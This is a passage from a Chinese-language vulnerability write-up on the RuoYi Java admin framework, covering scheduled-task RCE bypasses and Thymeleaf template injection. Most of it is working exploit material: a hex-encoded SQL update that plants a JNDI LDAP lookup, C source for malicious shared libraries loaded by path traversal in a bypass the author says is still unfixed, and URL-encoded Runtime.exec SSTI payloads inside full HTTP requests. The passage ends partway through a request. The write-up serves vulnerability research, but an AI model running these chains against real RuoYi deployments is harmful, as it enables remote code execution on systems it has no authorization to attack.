Constants.JOB_ERROR_STR))<br>    &#123;<br>        <span class="hljs-keyword">return</span> error(<span class="hljs-string">&quot;新增任务&#x27;&quot;</span> + job.getJobName() + <span class="hljs-string">&quot;&#x27;失败，目标字符串存在违规&quot;</span>);<br>    &#125;<br>    job.setCreateBy(getLoginName());<br>    <span class="hljs-keyword">return</span> toAjax(jobService.insertJob(job));<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="4-4-定时任务-RCE-bypass3（"><a href="#4-4-定时任务-RCE-bypass3（" class="headerlink" title="4.4 定时任务 RCE bypass3（&lt;V4.7.9）"></a>4.4 定时任务 RCE bypass3（&lt;V4.7.9）</h2><h3 id="漏洞复现-14"><a href="#漏洞复现-14" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">genTableServiceImpl.createTable(<span class="hljs-string">&quot;update sys_job set invoke_target=javax.naming.InitialContext.lookup(&#x27;ldap://xx.xx.xxx.xx:1389/Basic/Command/calc.exe&#x27;) where job_id = 102;&quot;</span>)<br>genTableServiceImpl.createTable(<span class="hljs-string">&quot;update sys_job set invoke_target=0x6A617661782E6E616D696E672E496E697469616C436F6E746578742E6C6F6F6B757028276C6461703A2F2F78782E78782E7878782E78783A313338392F42617369632F436F6D6D616E642F63616C632E6578652729 where job_id = 102;&quot;</span>)<br></code></pre></td></tr></table></figure><p>首先添加一个任意内容的定时任务执行</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1755309047416-0915e334-d1bc-405a-8f3c-1ca729640f7b.png"></p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1755309067494-fb5e97cc-88e1-42a0-a91f-97fa2a72ec2d.png"></p><p>通过<code>/monitor/job/list</code>接口可以查看<code>jobId</code>，这个是为了后面写 sql 语句实现定点修改；</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1755309098278-3524e6c2-9d18-4cf5-ab68-a1d32909a5ce.png"></p><p>在新建一个执行 sql 语句的定时任务；</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">genTableServiceImpl.createTable(<span class="hljs-string">&quot;update sys_job set invoke_target=javax.naming.InitialContext.lookup(&#x27;ldap://xx.xx.xxx.xx:1389/Basic/Command/calc.exe&#x27;) where job_id = 102;&quot;</span>)<br></code></pre></td></tr></table></figure><p>由于定时任务执行目标对<code>ldap(s)</code>进行了过滤，因为需要通过 16 进制<code>invoke_target</code>的值进行绕过</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">genTableServiceImpl.createTable(<span class="hljs-string">&quot;update sys_job set invoke_target=0x6A617661782E6E616D696E672E496E697469616C436F6E746578742E6C6F6F6B757028276C6461703A2F2F78782E78782E7878782E78783A313338392F42617369632F436F6D6D616E642F63616C632E6578652729 where job_id = 102;&quot;</span>)<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1755309690818-abaec647-ccba-4478-a324-8bc827355c08.png"></p><p>执行一次对应的定时任务；</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1755309793968-7605ef3a-932f-43a4-8e60-701a1150ddd1.png"></p><p>可以发现<code>103</code>编号的任务变成了刚才设置的值，然后就是利用 ldap 协议 rce 了；</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1755309832016-d74fb49c-0588-44cc-b735-543ad8a65e71.png"></p><p>执行一次以后即可发现</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1755310066758-8a424bd7-7ed1-49ec-8ff3-52159a3b75c9.png"></p><h3 id="漏洞分析-14"><a href="#漏洞分析-14" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>先阅读 4.1 小节的漏洞分析，了解定时任务的执行流程；</p><p>这个漏洞的原理就是利用了一个方法执行 sql 预取去修改数据库中存储的定时任务的内容，由于 sql 语句是支持 16 进制内容的，因此可以使用 16 进制绕过关键词过滤内容，实现定时任务修改，然后执行任务定时任务导致 rce。</p><p>这个漏洞利用了一下<code>/tool/gen/createTable</code>接口的 sql 注入漏洞，非直接利用，而是调用了其中的 Mybatis 服务方法；</p><p><code>/RuoYi-4.7.8/ruoyi-generator/src/main/resources/mapper/generator/GenTableMapper.xml</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;update id=<span class="hljs-string">&quot;createTable&quot;</span>&gt;<br>       $&#123;sql&#125;<br>&lt;/update&gt;<br></code></pre></td></tr></table></figure><p>对应的调用方法位于<code>/RuoYi-4.7.8/ruoyi-generator/src/main/java/com/ruoyi/generator/service/impl/GenTableServiceImpl.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 创建表</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> sql 创建表语句</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@return</span> 结果</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">createTable</span><span class="hljs-params">(String sql)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> genTableMapper.createTable(sql) == <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>根据这个语句方法就可以实现对任意的 sql 语句的调用，因此就能够实现对数据库内容的更改<code>UPDATE</code>；</p><p>因此我们调用这个方法的 bean 对象对数据库中的定时任务内容进行修改即可实现任意函数调用 RCE</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">genTableServiceImpl.createTable(<span class="hljs-string">&quot;update sys_job set invoke_target=javax.naming.InitialContext.lookup(&#x27;ldap://xx.xx.xxx.xx:1389/Basic/Command/calc.exe&#x27;) where job_id = 102;&quot;</span>)<br></code></pre></td></tr></table></figure><p>由于若依本身已经存在了对<code>ldap</code>的过滤，对于<code>invoke_target</code>设置的值采用 16 进制 bypass，因为 sql 语句本身是执行 16 进制的，因此不会对设置内容产生影响；</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">genTableServiceImpl.createTable(<span class="hljs-string">&quot;update sys_job set invoke_target=0x6A617661782E6E616D696E672E496E697469616C436F6E746578742E6C6F6F6B757028276C6461703A2F2F78782E78782E7878782E78783A313338392F42617369632F436F6D6D616E642F63616C632E6578652729 where job_id = 102;&quot;</span>)<br></code></pre></td></tr></table></figure><p>因此，我们可以将定时任务的执行目标修改为任意内容；</p><h2 id="4-5-定时任务-RCE-bypass4（未修复）"><a href="#4-5-定时任务-RCE-bypass4（未修复）" class="headerlink" title="4.5 定时任务 RCE bypass4（未修复）"></a>4.5 定时任务 RCE bypass4（未修复）</h2><blockquote><p>截止到漏洞分析时间：该漏洞在最新版本 ruoyi V4.8.1 中仍未修复</p></blockquote><h3 id="漏洞复现-15"><a href="#漏洞复现-15" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>本次复现环境为<code>windows11 + jdk8_121 + ruoyi4.8.0</code>，若采用 linux 和 macos 复现，则动态链接库的编写都存在一定差异，届时会给出相应内容；</p><p>首先需要制作一个即将被加载的动态链接库</p><ul><li>windows</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br>BOOL APIENTRY <span class="hljs-title function_">DllMain</span><span class="hljs-params">(HMODULE hModule,</span><br><span class="hljs-params">                      DWORD  ul_reason_for_call,</span><br><span class="hljs-params">                      LPVOID lpReserved)</span> &#123;<br>    <span class="hljs-keyword">if</span> (ul_reason_for_call == DLL_PROCESS_ATTACH) &#123;<br>        system(<span class="hljs-string">&quot;calc.exe&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">return</span> TRUE;<br>&#125;<br><br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">gcc -shared -o calc.dll calc.c -Wall<br>x86_64-w64-mingw32-gcc -shared -o calc.dll calc.c -Wall<br></code></pre></td></tr></table></figure><ul><li>linux</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br>__attribute__((constructor))<br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">run</span><span class="hljs-params">()</span> &#123;<br>    system(<span class="hljs-string">&quot;gnome-calculator &amp;&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">gcc -fPIC -shared -o calc.so calc.c<br></code></pre></td></tr></table></figure><ul><li>macos</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br>__attribute__((constructor))<br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">run</span><span class="hljs-params">()</span> &#123;<br>    system(<span class="hljs-string">&quot;open -a Calculator&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">gcc -arch x86_64 -shared -o calc.dylib calc.c<br></code></pre></td></tr></table></figure><p>制作完成动态链接库一下，使用若依的文件上传接口<code>&lt;font style=&quot;color:rgb(68, 68, 68);background-color:rgb(245, 245, 245);&quot;&gt;/common/upload&lt;/font&gt;</code>将动态链接库上传到服务端</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1755311736878-4a8a2e8a-4d5f-40a9-bd8c-64546446a250.png"></p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1755311787974-39ee63e3-4f32-4db1-bfce-a4800a832032.png"></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/common/upload</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>192.168.1.9<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:141.0) Gecko/20100101 Firefox/141.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>application/json, text/javascript, */*; q=0.01<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">X-Requested-With</span><span class="hljs-punctuation">: </span>XMLHttpRequest<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>multipart/form-data; boundary=----geckoformboundarya01d77708851835ad52282b087ed68e7<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>100346<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://192.168.1.9<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://192.168.1.9/demo/form/upload<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>JSESSIONID=54ba609e-21d6-417b-ae7b-cdc1bc8bad2b<br><span class="hljs-attribute">Priority</span><span class="hljs-punctuation">: </span>u=0<br><br><span class="language-pgsql"><span class="hljs-comment">------geckoformboundarya01d77708851835ad52282b087ed68e7</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;file&quot;; filename=&quot;com.ruoyi.quartz.task.txt&quot;</span><br><span class="language-pgsql">Content-<span class="hljs-keyword">Type</span>: application/octet-stream</span><br><span class="language-pgsql"></span><br><span class="language-pgsql">恶意动态链接库二进制文件</span><br><span class="language-pgsql"><span class="hljs-comment">------geckoformboundarya01d77708851835ad52282b087ed68e7</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;fileId&quot;</span><br><span class="language-pgsql"></span><br><span class="language-pgsql"><span class="hljs-number">99612</span>_calc.dll</span><br><span class="language-pgsql"><span class="hljs-comment">------geckoformboundarya01d77708851835ad52282b087ed68e7</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;initialPreview&quot;</span><br><span class="language-pgsql"></span><br><span class="language-pgsql">[]</span><br><span class="language-pgsql"><span class="hljs-comment">------geckoformboundarya01d77708851835ad52282b087ed68e7</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;initialPreviewConfig&quot;</span><br><span class="language-pgsql"></span><br><span class="language-pgsql">[]</span><br><span class="language-pgsql"><span class="hljs-comment">------geckoformboundarya01d77708851835ad52282b087ed68e7</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;initialPreviewThumbTags&quot;</span><br><span class="language-pgsql"></span><br><span class="language-pgsql">[]</span><br><span class="language-pgsql"><span class="hljs-comment">------geckoformboundarya01d77708851835ad52282b087ed68e7--</span></span><br></code></pre></td></tr></table></figure><p>文件上传成功以后，由于文件后缀过滤的缘故，还需要将文件名修改为动态链接库后缀，<code>linux-&gt;.so</code>、<code>macos-&gt;.dylib</code>、<code>window-&gt;.dll</code>；该操作依旧是通过定时任务实现；</p><p>这个文件路径还是需要猜测的，这就是利用的难点？如果猜不到文件上传路径，那都白搭</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">ch.qos.logback.core.rolling.helper.RenameUtil.renameByCopying(&#x27;../upload/upload/2025/08/16/com.ruoyi.quartz.task_20250816103604A001.txt&#x27;,&#x27;../upload/upload/2025/08/16/com.ruoyi.quartz.task_20250816103604A001.dll&#x27;)<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1755314445005-b9bdd4f9-591b-466f-8457-202acb519a06.png"></p><p>设置定时任务<code>com.sun.glass.utils.NativeLibLoader.loadLibrary</code>加载我们上传的动态链接库文件内容</p><p>对于这个加载的路径如何选择，loadLibrary 默认在<code>&lt;path to jdk&gt;/jre/bin/</code>路径下搜索，所以需要通过目录穿越找到我们上传的动态链接库文件，这又是一大难点；</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">com.sun.glass.utils.NativeLibLoader.loadLibrary(&quot;../../../../../../../../../../code/Java/RuoYi/upload/upload/2025/08/16/com.ruoyi.quartz.task_20250816103604A001&quot;);<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1755314799178-8a8ed285-b809-431e-84c3-d76ef0165a4c.png"></p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1755314841264-5926c82d-ee8b-42b4-b411-7c44fc3fc22f.png"></p><h3 id="漏洞分析-15"><a href="#漏洞分析-15" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>怎么说呢？看到漏洞复现的过程的话，漏洞原因应该都蛮清晰了；这是多个漏洞点组合起来的 rce，且还存在路径爆破等问题需要解决，利用难度还挺大的；</p><p>该漏洞截至目前仍未修改，所以仍在可利用，但是路径问题缺失是一个大问题；</p><p>这里放两篇文章吧（ps：写得挺累的啦，不想写了）</p><p><a href="https://mp.weixin.qq.com/s?__biz=MzkyNTYxNDAwNQ==&mid=2247484714&idx=1&sn=19e40a91e637794253c8691d7ffe40c6&poc_token=HOHwn2ijyPdDN9S8Wb-cCbXiXrNrQEgt0m-PxsRJ">【安全研究】若依4.8.0版本计划任务RCE研究</a></p><p><a href="https://www.dalon.top/archives/ruo-yi-ruoyi-4.8.0hou-tai-rce-fu-xian">若依Ruoyi-4.8.0后台RCE（复现）</a></p><h1 id="5-SSTI模版注入-RCE"><a href="#5-SSTI模版注入-RCE" class="headerlink" title="5 SSTI模版注入 RCE"></a>5 SSTI模版注入 RCE</h1><h2 id="5-1-注入接口-monitor-cache-getNames（V4-6-1"><a href="#5-1-注入接口-monitor-cache-getNames（V4-6-1" class="headerlink" title="5.1 注入接口/monitor/cache/getNames（V4.6.1&lt;Version&lt;V4.7.2）"></a>5.1 注入接口<code>/monitor/cache/getNames</code>（V4.6.1&lt;Version&lt;V4.7.2）</h2><h3 id="漏洞复现-16"><a href="#漏洞复现-16" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1754707935928-0e87f4d1-c276-4a8f-a53f-1c4418845ae2.png"></p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1754707961762-7dc50c21-8171-460c-baf4-a102017a2130.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plain">// payload(空格绕过检查)<br>$&#123;T (java.lang.Runtime).getRuntime().exec(&quot;calc.exe&quot;)&#125;<br>// URL编码<br>%24%7b%54%20%28%6a%61%76%61%2e%6c%61%6e%67%2e%52%75%6e%74%69%6d%65%29%2e%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%22%63%61%6c%63%2e%65%78%65%22%29%7d<br></code></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/monitor/cache/getNames</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>192.168.1.9<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:141.0) Gecko/20100101 Firefox/141.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded; charset=UTF-8<br><span class="hljs-attribute">X-Requested-With</span><span class="hljs-punctuation">: </span>XMLHttpRequest<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>171<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://192.168.1.9<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://192.168.1.9/monitor/cache<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>JSESSIONID=aa74c322-b8a5-46a4-81d1-66dcf34f5380<br><br><span class="language-llvm">fragment<span class="hljs-operator">=</span><span class="hljs-variable">%24</span><span class="hljs-variable">%7</span>b<span class="hljs-variable">%54</span><span class="hljs-variable">%20</span><span class="hljs-variable">%28</span><span class="hljs-variable">%6</span>a<span class="hljs-variable">%61</span><span class="hljs-variable">%76</span><span class="hljs-variable">%61</span><span class="hljs-variable">%2</span>e<span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%61</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%67</span><span class="hljs-variable">%2</span>e<span class="hljs-variable">%52</span><span class="hljs-variable">%75</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%74</span><span class="hljs-variable">%69</span><span class="hljs-variable">%6</span>d<span class="hljs-variable">%65</span><span class="hljs-variable">%29</span><span class="hljs-variable">%2</span>e<span class="hljs-variable">%67</span><span class="hljs-variable">%65</span><span class="hljs-variable">%74</span><span class="hljs-variable">%52</span><span class="hljs-variable">%75</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%74</span><span class="hljs-variable">%69</span><span class="hljs-variable">%6</span>d<span class="hljs-variable">%65</span><span class="hljs-variable">%28</span><span class="hljs-variable">%29</span><span class="hljs-variable">%2</span>e<span class="hljs-variable">%65</span><span class="hljs-variable">%78</span><span class="hljs-variable">%65</span><span class="hljs-variable">%63</span><span class="hljs-variable">%28</span><span class="hljs-variable">%22</span><span class="hljs-variable">%63</span><span class="hljs-variable">%61</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%63</span><span class="hljs-variable">%2</span>e<span class="hljs-variable">%65</span><span class="hljs-variable">%78</span><span class="hljs-variable">%65</span><span class="hljs-variable">%22</span><span class="hljs-variable">%29</span><span class="hljs-variable">%7</span>d</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1754708037144-7be1dc16-324e-46e2-95cd-231aa27d2458.png"></p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1754708075775-f4a65bae-978d-4c41-934d-86d1a208586f.png"></p><h3 id="漏洞分析-16"><a href="#漏洞分析-16" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>详细的Thymeleaf 模版注入原理参考文章 <a href="https://blog.csdn.net/weixin_43263451/article/details/126543803">https://blog.csdn.net/weixin_43263451&#x2F;article&#x2F;details&#x2F;126543803</a></p><p>这里简单分析一下漏洞点，通过<code>pom.xml</code>文件分析可以看出若依采用了thymeleaf 模板，后续如果控制器返回视图则采用 thymeleaf 模板进行解析；</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- SpringBoot集成thymeleaf模板 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-thymeleaf<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>可以看到在<code>/monitor/cache/getName</code>接口的处理中返回视图，且<code>fragment</code>是通过参数传入的内容，因此可实现 thymeleaf 模板注入；</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@PostMapping(&quot;/getNames&quot;)</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">getCacheNames</span><span class="hljs-params">(String fragment, ModelMap mmap)</span><br>&#123;<br>    mmap.put(<span class="hljs-string">&quot;cacheNames&quot;</span>, cacheService.getCacheNames());<br>    <span class="hljs-keyword">return</span> prefix + <span class="hljs-string">&quot;/cache::&quot;</span> + fragment;<br>&#125;<br></code></pre></td></tr></table></figure><p>由于 thymeleaf 本身存在<font style="color:rgb(77, 77, 77);">检查参数值中是否使用了”T(SomeClass)“或者”new SomeClass”</font></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">$&#123;T(java.lang.Runtime).exec(&#x27;calc&#x27;)&#125;<br></code></pre></td></tr></table></figure><blockquote><p>3.x 版本后的thymeleaf 的 bypass 方法：<a href="https://www.qwesec.com/2025/02/thymeleafSSTI.html">https://www.qwesec.com/2025/02/thymeleafSSTI.html</a></p></blockquote><h2 id="5-2-注入接口-monitor-cache-getKeys（V4-6-1"><a href="#5-2-注入接口-monitor-cache-getKeys（V4-6-1" class="headerlink" title="5.2 注入接口/monitor/cache/getKeys（V4.6.1&lt;Version&lt;V4.7.2）"></a>5.2 注入接口<code>/monitor/cache/getKeys</code>（V4.6.1&lt;Version&lt;V4.7.2）</h2><h3 id="漏洞复现-17"><a href="#漏洞复现-17" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1754708167988-0f78dd7b-d930-4b57-8cb4-630c79056511.png"></p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1754708183990-0def1c4c-b106-4ba4-ae7e-dfeb325072c7.png"></p><p>随便设置一个<code>cacheName</code>的值，然后修改<code>fragment</code>的内容为 payload 的 URL 编码即可；</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plain">// payload(空格绕过检查)<br>$&#123;T (java.lang.Runtime).getRuntime().exec(&quot;calc.exe&quot;)&#125;<br>// URL编码<br>%24%7b%54%20%28%6a%61%76%61%2e%6c%61%6e%67%2e%52%75%6e%74%69%6d%65%29%2e%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%22%63%61%6c%63%2e%65%78%65%22%29%7d<br></code></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/monitor/cache/getKeys</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>192.168.1.9<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:141.0) Gecko/20100101 Firefox/141.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span 